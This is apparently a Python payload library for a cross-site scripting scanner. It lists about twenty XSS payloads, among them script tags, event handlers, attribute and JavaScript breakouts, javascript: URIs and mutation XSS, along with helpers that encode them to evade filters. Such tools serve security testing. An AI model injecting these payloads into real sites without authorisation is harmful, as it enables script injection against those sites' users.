"""Payload library and encoding helpers."""
from urllib.parse import quote, unquote
import html as html_mod

# (payload, category, description)
PAYLOADS = [
    # HTML body / raw injection
    ("<script>alert(1)</script>", "script", "Plain script tag"),
    ("<script>alert(document.domain)</script>", "script", "Script tag w/ domain"),
    ('<img src=x onerror=alert(1)>', "event", "Img onerror"),
    ('<svg/onload=alert(1)>', "event", "SVG onload"),
    ('<details open ontoggle=alert(1)>', "event", "Details ontoggle"),
    ('<iframe srcdoc="<script>alert(1)</script>">', "iframe", "Iframe srcdoc"),
    ('<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">',
     "mutation", "Mutation XSS (mXSS)"),
    # Attribute breakout
    ('"><svg onload=alert(1)>', "attr_dq", "Double-quote breakout"),
    ("'><svg onload=alert(1)>", "attr_sq", "Single-quote breakout"),
    ('" autofocus onfocus=alert(1) x="', "attr_auto", "autofocus/onfocus breakout"),
    ("' autofocus onfocus=alert(1) x='", "attr_auto", "autofocus/onfocus single-quote"),
    # JS context
    ("';alert(1);//", "js_sq", "JS single-quote breakout"),
    ('";alert(1);//', "js_dq", "JS double-quote breakout"),
    ("</script><script>alert(1)</script>", "js_break", "Closing script tag breakout"),
    ("-alert(1)-", "js_expr", "JS expression context"),
    ("alert(1)//", "js_direct", "Direct JS execution"),
    # URL / href / src sinks
    ("javascript:alert(1)", "url_js", "javascript: URI"),
    ("JaVaScRiPt:alert(1)", "url_js_obf", "Obfuscated javascript: URI"),
    ("javascript:alert(1)//", "url_js_comment", "javascript: URI w/ comment"),
    # Protocol-relative / encoding stress
    ("\x3cscript\x3ealert(1)\x3c/script\x3e", "obf_hex", "Hex-escaped tags"),
    ("<scr<script>ipt>alert(1)</scr</script>ipt>", "mutation2", "Nested tag mutation"),
]

# Transform helpers for obfuscation during injection
def urlencode(s: str, double: bool = False) -> str:
    out = quote(s, safe="")
    return quote(out, safe="") if double else out

def html_entity(s: str) -> str:
    return html_mod.escape(s, quote=True)

def unicode_obfuscate(s: str) -> str:
    # e.g. encode '<' as &#x3c; style variants
    return "".join(
        f"&#x{ord(c):x};" if c in "<>/\"'" else c for c in s
    )

def base_payloads():
    """Raw payloads — always injected as-is first."""
    return PAYLOADS

def encoded_variants(payload: str):
    """Return (label, transformed_payload) variants for one raw payload."""
    return [
        ("url", urlencode(payload)),
        ("url2", urlencode(payload, double=True)),
        ("entity", html_entity(payload)),
        ("unicode", unicode_obfuscate(payload)),
    ]
